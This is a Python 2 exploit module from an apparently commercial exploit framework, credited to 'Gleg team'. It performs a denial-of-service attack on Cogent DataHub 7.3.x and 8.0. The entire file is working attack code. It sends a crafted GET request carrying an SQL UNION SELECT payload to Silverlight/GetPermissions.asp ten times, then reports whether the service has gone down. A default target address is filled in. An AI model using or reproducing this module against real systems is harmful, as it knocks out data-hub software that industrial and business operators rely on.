#!/usr/bin/env python

import urllib2
import errno
import socket
from collections import OrderedDict

from Sploit import Sploit
INFO = {}
INFO['NAME'] = "efs_cogent_datahub_7_3_x_dos"
INFO['DESCRIPTION'] = "Cogent Datahub 7.3.x Denial of Service"
INFO['VENDOR'] = "http://www.cogentdatahub.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Specially crafted GET request cause DoS. Also works on version 8.
Checked against version 7.3.14.585 and 8.0 on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.cogentdatahub.com/Download_Software.html"
INFO["LINKS"] = [""]
INFO['CHANGELOG']="17 Nov, 2017. Written by Gleg team."
INFO['PATH'] = "Dos/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["BASEPATH"] = "/"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.listener_port = None

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.vhost = self.args.get("BASEPATH", OPTIONS["BASEPATH"])
        self.vhost = self.vhost if self.vhost.endswith("/") else self.vhost + "/"
        self.url = "http://{}:{}/{}".format(self.host, self.port, self.vhost) + "Silverlight/GetPermissions.asp?username=test%%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL%20--"

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Sending crafted request...")
        for i in range(10):
            try:
                urllib2.urlopen(self.url)
            except socket.error as error:
                if error.errno == errno.WSAECONNRESET:
                    self.log("[+] Service is unavailable now")
                    self.finish(True)
        self.log("All data sent...")
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
